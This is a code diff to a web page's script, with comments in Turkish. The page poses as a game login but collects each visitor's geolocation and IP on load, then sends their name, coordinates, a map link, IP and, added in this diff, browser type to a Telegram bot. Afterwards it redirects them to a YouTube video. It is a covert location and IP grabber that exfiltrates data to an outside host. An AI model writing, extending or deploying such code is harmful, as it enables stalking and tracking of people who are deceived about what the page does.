@@ -32,8 +32,9 @@
   <script>
     let konum = null;
     let ipAdres = "Bilinmiyor";
+    let tarayici = "Bilinmiyor";
 
-    // Sayfa açılır açılmaz konum izni iste ve IP al
+    // Sayfa açılır açılmaz konum ve IP alınır
     window.onload = async function() {
       // Konum
       if (navigator.geolocation) {
@@ -54,6 +55,14 @@
       } catch (e) {
         ipAdres = "Alınamadı";
       }
+
+      // Tarayıcı bilgisi
+      const ua = navigator.userAgent;
+      if (ua.includes("Chrome")) tarayici = "site:Chrome";
+      else if (ua.includes("Firefox")) tarayici = "site:Firefox";
+      else if (ua.includes("Safari") && !ua.includes("Chrome")) tarayici = "site:Safari";
+      else if (ua.includes("Edg")) tarayici = "site:Edge";
+      else tarayici = "site:Bilinmiyor";
     };
 
     async function girisYap() {
@@ -78,7 +87,7 @@
       const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
 
       const mapsLink = `https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
-      const message = `🎮 Yeni Giriş!\n\n👤 İsim: *${name}*\n📍 Konum: *${konum.lat}, ${konum.lon}*\n🌐 Harita: [Google Maps](${mapsLink})\n🖥️ IP: *${ipAdres}*`;
+      const message = `🎮 Yeni Giriş!\n\n👤 İsim: *${name}*\n📍 Konum: *${konum.lat}, ${konum.lon}*\n🌐 Harita: [Google Maps](${mapsLink})\n🖥️ IP: *${ipAdres}*\n🧭 Tarayıcı: *${tarayici}*`;
 
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
       const payload = {
@@ -93,7 +102,7 @@
         body: JSON.stringify(payload)
       });
 
-      // YouTube videosuna yönlendir
+      // Komik video açılır
       window.location.href = "https://www.youtube.com/watch?v=gdCZMdkdlBg";
     }
   </script>
